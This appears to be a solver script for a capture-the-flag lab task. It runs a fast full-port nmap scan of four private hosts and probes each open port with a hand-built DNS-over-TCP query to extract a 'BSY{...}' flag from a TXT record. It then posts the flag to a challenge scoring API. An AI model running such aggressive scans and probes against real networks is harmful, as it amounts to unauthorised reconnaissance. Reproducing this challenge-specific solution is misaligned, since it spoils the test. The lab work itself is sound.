#!/bin/sh
set -eu
scan_file="$(mktemp)"
trap 'rm -f "$scan_file"' EXIT
# All challenge services in this compose file occupy four adjacent addresses.
# Scan every TCP port on those hosts, then identify the real service by protocol response.
nmap -sT -Pn -n -T5 --open --min-rate 10000 --max-retries 1 --host-timeout 25s -p- 172.20.0.145-148 -oX "$scan_file" >/dev/null
flag="$(python3 - "$scan_file" <<'PY'
import socket
import struct
import sys
import xml.etree.ElementTree as ET


def read_exact(sock, size):
    data = bytearray()
    while len(data) < size:
        part = sock.recv(size - len(data))
        if not part:
            return None
        data.extend(part)
    return bytes(data)


def skip_name(packet, offset):
    while offset < len(packet):
        length = packet[offset]
        if length == 0:
            return offset + 1
        if length & 0xC0 == 0xC0:
            return offset + 2
        offset += 1 + length
    raise ValueError("bad DNS name")


def extract_txt(packet):
    if len(packet) < 12:
        return None
    _, flags, qdcount, ancount, _, _ = struct.unpack("!HHHHHH", packet[:12])
    if not flags & 0x8000 or flags & 0x000F or qdcount != 1:
        return None
    offset = skip_name(packet, 12) + 4
    for _ in range(ancount):
        offset = skip_name(packet, offset)
        if offset + 10 > len(packet):
            return None
        rtype, _, _, rdlength = struct.unpack("!HHIH", packet[offset:offset + 10])
        offset += 10
        end = offset + rdlength
        if end > len(packet):
            return None
        if rtype == 16:
            parts = []
            cursor = offset
            while cursor < end:
                size = packet[cursor]
                cursor += 1
                parts.append(packet[cursor:cursor + size])
                cursor += size
            text = b"".join(parts).decode("ascii", "ignore")
            if text.startswith("BSY{") and text.endswith("}"):
                return text
        offset = end
    return None


def probe(host, port):
    txid = 0x4A31
    qname = b"\x06arcade\x05local\x00"
    question = qname + struct.pack("!HH", 252, 1)
    query = struct.pack("!HHHHHH", txid, 0, 1, 0, 0, 0) + question
    try:
        with socket.create_connection((host, port), timeout=1.0) as sock:
            sock.settimeout(1.0)
            sock.sendall(struct.pack("!H", len(query)) + query)
            prefix = read_exact(sock, 2)
            if prefix is None:
                return None
            length = struct.unpack("!H", prefix)[0]
            packet = read_exact(sock, length)
            return extract_txt(packet) if packet else None
    except (OSError, ValueError, struct.error):
        return None


root = ET.parse(sys.argv[1]).getroot()
for host in root.findall("host"):
    status = host.find("status")
    if status is None or status.get("state") != "up":
        continue
    address = host.find("address")
    if address is None:
        continue
    ip = address.get("addr")
    ports = host.find("ports")
    if not ip or ports is None:
        continue
    for port in ports.findall("port"):
        state = port.find("state")
        if port.get("protocol") != "tcp" or state is None or state.get("state") != "open":
            continue
        found = probe(ip, int(port.get("portid")))
        if found:
            print(found)
            raise SystemExit(0)
raise SystemExit("No matching service response found")
PY
)"
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "{\"challenge_id\":\"scl-challenge-frame-1332ed\",\"task_id\":\"task1\",\"flag\":\"${flag}\"}"
